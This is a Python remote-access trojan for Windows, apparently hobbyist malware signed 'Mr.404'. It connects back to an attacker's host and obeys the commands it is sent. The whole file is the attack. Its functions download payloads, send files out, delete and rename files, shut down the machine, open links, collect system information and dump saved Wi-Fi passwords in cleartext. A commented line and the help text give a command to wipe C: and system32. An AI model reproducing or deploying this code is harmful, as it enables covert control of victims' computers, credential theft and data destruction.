from socket import *
from plyer import notification
import subprocess
import platform
import os
import requests
import time
os.system('cls')
s = socket(2,1)
s.connect(("myip",myport))
 
def upload_file():
    try:
        url = command.replace('upload_file ','')
        r = requests.get(url, allow_redirects=True)
        open('YOU_HAVE_BEEN_HACKED.jpg', 'wb').write(r.content)
        s.send('I Upload Your File'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def Virus_danger():
    try:
        s.send('not now'.encode())
        #os.system('#RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.')
    except:
        s.send('We Have Bug Here . . .'.encode())

def download_():
    try:
        


            filename = command.replace('pickup ','')  #   test.txt\
            data = open(filename,'a+').write("""


----------------
Hacked By Mr.404
----------------

        """)
            filesender = open(filename,'r').read()
            s.send(filesender.encode())
            time.sleep(4)
            s.send('file download'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def cd_dir():
    try:
        dirname = command.replace('cd ','')
        os.chdir(dirname)
        s.send('Directory Changed'.encode())
    except:
        s.send('We Have Problem Here . . .'.encode())


def rename_file():
    try:
        namefile = command.replace('ren_file_','')
        namesfile = namefile.split(sep=' ')
        os.rename(namesfile[0],namesfile[1])
        s.send('File Renamed'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def shutdown_():
    try:
        os.system('shutdown -s')
        s.send('system turn off'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def restart_():
    try:
        os.system('shutdown -r')
        s.send('system restarted'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def pwd_():
    try:
        pwd = os.getcwd()
        s.send(pwd.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def openlink():
    try:
        link = command.replace('open_link ','')
        os.system(f'powershell start-process "{link}"')
        s.send('link opened'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def dir_list():
    try:
        dirlist = subprocess.getoutput("fsutil fsinfo drives")
        s.send(dirlist.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def sysinfo_():
    try:
        systeminfo = subprocess.getoutput('systeminfo')
        s.send(systeminfo.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def ls_():
    try:
        ls = subprocess.getoutput('dir /b')
        s.send(ls.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def rm_file():
    try:
        name = command.replace('rm_file ','')
        os.remove(name)
        s.send('File removed'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def get_wlan():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        s.send("{:<30}|  {:<}".format(i, results[0]).encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def uptxt():
    try:
        ftext = command.replace('uptxt','')
        text = ftext.split(sep=' ')
        txtfile = open(f'{text[1]}',mode='w').write(text[0])
        s.send('I Upload Your File'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())



def send_alert():
    try:
        needs = command.replace('s_alert_','')
        needls = needs.split(sep=' ')
        notification.notify(
            title = needls[0],
            message = needls[1],
            app_icon = None,
            timeout = 10,
        )
        s.send('Sent'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def helplist():
    helpls = """
pwd : pwd 
---
Upload file : upload_file + (with link)
---
Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
---
Download File : pickup + [name of file] (.txt files)
---
Change Directory : cd (cd + [dir name])
---
Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
---
Shutdown,Restart : shutdown,restart
---
open link : open_link + http://example.com (open any link in target system)
---
drives list : dir_ls (see the name of the drives)
---
system information : sys_info 
---
file list : ls (see all the file names that you are in drive)
---
Remove file : rm_file + [filename] (delete any files for ever)
---
Hack System Wlans : hackwifi (get name and password)
---
upload txt file : uptxt_ + [your text,dont use space] + [yourname]
    """
    s.send(helpls.encode())

while True:
    command = s.recv(1234).decode()

    if "pwd" == command:
        pwd_()
    elif "get_shell" in command:
        None
    elif "upload_file " in command:
        upload_file()
    elif "danger_virus" in command:
        Virus_danger()
    elif "pickup " in command:
        download_()
    elif "cd " in command:
        cd_dir()
    elif "ren_file_" in command:
        rename_file()
    elif "shutdown" in command:
        shutdown_()
    elif "restart" in command:
        restart_()
    elif "open_link" in command:
        openlink()
    elif "dir_ls" in command:
        dir_list()
    elif "sys_info" in command:
        sysinfo_()
    elif "ls" in command:
        ls_()
    elif "rm_file" in command:
        rm_file()
    elif "" or "\n" in command:
        s.send("Not Found".encode())
    elif "help" in command or "?" in command:
        helplist()
    elif "hackwifi" in command:
        get_wlan()
    elif 'uptxt_' in command:
        uptxt()
    elif 's_alert_' in command:
        send_alert()